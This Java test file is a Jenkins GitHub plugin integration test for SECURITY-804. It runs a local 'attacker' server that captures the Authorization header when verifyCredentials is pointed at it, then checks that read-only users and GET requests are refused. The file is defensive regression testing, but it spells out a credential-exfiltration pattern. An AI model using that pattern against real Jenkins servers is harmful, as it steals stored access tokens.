package org.jenkinsci.plugins.github.config;

import com.cloudbees.plugins.credentials.Credentials;
import com.cloudbees.plugins.credentials.CredentialsProvider;
import com.cloudbees.plugins.credentials.CredentialsScope;
import com.cloudbees.plugins.credentials.CredentialsStore;
import com.cloudbees.plugins.credentials.domains.Domain;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import net.sf.json.JSONObject;
import org.htmlunit.HttpMethod;
import org.htmlunit.Page;
import org.htmlunit.WebRequest;
import hudson.security.GlobalMatrixAuthorizationStrategy;
import hudson.util.Secret;
import jenkins.model.Jenkins;
import org.jenkinsci.plugins.plaincredentials.impl.StringCredentialsImpl;
import org.junit.After;
import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.jvnet.hudson.test.For;
import org.jvnet.hudson.test.Issue;
import org.jvnet.hudson.test.JenkinsRule;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;

import static org.hamcrest.MatcherAssert.assertThat;
import static org.hamcrest.Matchers.equalTo;
import static org.hamcrest.Matchers.isEmptyOrNullString;
import static org.hamcrest.Matchers.not;

/**
 * Integration counterpart of GitHubServerConfigTest
 */
@For(GitHubServerConfig.class)
public class GitHubServerConfigIntegrationTest {
    
    @Rule
    public JenkinsRule j = new JenkinsRule();
    
    private HttpServer server;
    private AttackerServlet attackerServlet;
    private String attackerUrl;
    
    @Before
    public void setupServer() throws Exception {
        setupAttackerServer();
    }
    
    @After
    public void stopServer() {
        server.stop(1);
    }
    
    private void setupAttackerServer() throws Exception {
        this.server = HttpServer.create(new InetSocketAddress(InetAddress.getLoopbackAddress(), 0), 0);
        this.attackerServlet = new AttackerServlet();
        this.server.createContext("/user", this.attackerServlet);
        this.server.start();
        InetSocketAddress addr = this.server.getAddress();
        this.attackerUrl = String.format("http://%s:%d", addr.getHostString(), addr.getPort());
    }
    
    @Test
    @Issue("SECURITY-804")
    public void shouldNotAllow_CredentialsLeakage_usingVerifyCredentials() throws Exception {
        final String credentialId = "cred_id";
        final String secret = "my-secret-access-token";
        
        setupCredentials(credentialId, secret);
        
        final URL url = new URL(
                j.getURL() +
                        "descriptorByName/org.jenkinsci.plugins.github.config.GitHubServerConfig/verifyCredentials?" +
                        "apiUrl=" + attackerUrl + "&credentialsId=" + credentialId
        );
        
        j.jenkins.setCrumbIssuer(null);
        j.jenkins.setSecurityRealm(j.createDummySecurityRealm());

        GlobalMatrixAuthorizationStrategy strategy = new GlobalMatrixAuthorizationStrategy();
        Jenkins.MANAGE.setEnabled(true);
        strategy.add(Jenkins.MANAGE, "admin");
        strategy.add(Jenkins.READ, "admin");
        strategy.add(Jenkins.READ, "user");
        j.jenkins.setAuthorizationStrategy(strategy);
        
        { // as read-only user
            JenkinsRule.WebClient wc = j.createWebClient();
            wc.getOptions().setThrowExceptionOnFailingStatusCode(false);
            wc.login("user");
            
            Page page = wc.getPage(new WebRequest(url, HttpMethod.POST));
            assertThat(page.getWebResponse().getStatusCode(), equalTo(403));
            
            assertThat(attackerServlet.secretCreds, isEmptyOrNullString());
        }
        { // only admin (with Manage permission) can verify the credentials
            JenkinsRule.WebClient wc = j.createWebClient();
            wc.getOptions().setThrowExceptionOnFailingStatusCode(false);
            wc.login("admin");
            
            Page page = wc.getPage(new WebRequest(url, HttpMethod.POST));
            assertThat(page.getWebResponse().getStatusCode(), equalTo(200));
            
            assertThat(attackerServlet.secretCreds, not(isEmptyOrNullString()));
            attackerServlet.secretCreds = null;
        }
        {// even admin must use POST
            JenkinsRule.WebClient wc = j.createWebClient();
            wc.getOptions().setThrowExceptionOnFailingStatusCode(false);
            wc.login("admin");
            
            Page page = wc.getPage(new WebRequest(url, HttpMethod.GET));
            assertThat(page.getWebResponse().getStatusCode(), not(equalTo(200)));
            
            assertThat(attackerServlet.secretCreds, isEmptyOrNullString());
        }
    }
    
    private void setupCredentials(String credentialId, String secret) throws Exception {
        CredentialsStore store = CredentialsProvider.lookupStores(j.jenkins).iterator().next();
        // currently not required to follow the UI restriction in terms of path constraint when hitting directly the URL
        Domain domain = Domain.global();
        Credentials credentials = new StringCredentialsImpl(CredentialsScope.GLOBAL, credentialId, "", Secret.fromString(secret));
        store.addCredentials(domain, credentials);
    }
    
    private static class AttackerServlet implements HttpHandler {
        public String secretCreds;
        
        @Override
        public void handle(HttpExchange he) throws IOException {
            if ("GET".equals(he.getRequestMethod())) {
                this.onUser(he);
            } else {
                he.sendResponseHeaders(HttpURLConnection.HTTP_BAD_METHOD, -1);
            }
        }
        
        private void onUser(HttpExchange he) throws IOException {
            secretCreds = he.getRequestHeaders().getFirst("Authorization");
            String response = JSONObject.fromObject(
                    new HashMap<String, Object>() {{
                        put("login", "alice");
                    }}
            ).toString();
            byte[] body = response.getBytes(StandardCharsets.UTF_8);
            he.sendResponseHeaders(HttpURLConnection.HTTP_OK, body.length);
            try (OutputStream os = he.getResponseBody()) {
                os.write(body);
            }
        }
    }
}
